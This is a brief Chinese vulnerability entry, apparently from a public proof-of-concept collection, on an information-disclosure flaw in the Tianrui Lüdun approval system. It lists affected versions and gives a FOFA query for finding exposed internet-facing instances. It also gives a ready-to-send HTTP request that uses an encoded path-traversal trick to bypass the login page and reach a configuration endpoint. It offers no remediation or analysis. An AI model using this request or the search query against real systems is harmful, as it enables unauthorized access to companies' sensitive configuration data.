## 天锐绿盾审批系统敏感信息泄露漏洞

## 一、漏洞简介
天锐绿盾审批系统是一款专注于企业数据安全与合规管理的智能审批平台，深度融合文档加密、权限管控与流程自动化，为企业提供从文件创建、流转到归档的全生命周期安全管控，常作为集成在OA系统中的加密软件，用于实现审批流程的自动化和信息化。

## 二、影响版本
V3.53.240913

V7.05.240904

## fofa
```
app="TIPPAY-绿盾审批系统"
```

## POC
```
POST /trwfe/login.jsp/.%2e/config/getConfigValues.do HTTP/1.1
Host: 1
Content-Type: application/x-www-form-urlencoded
```
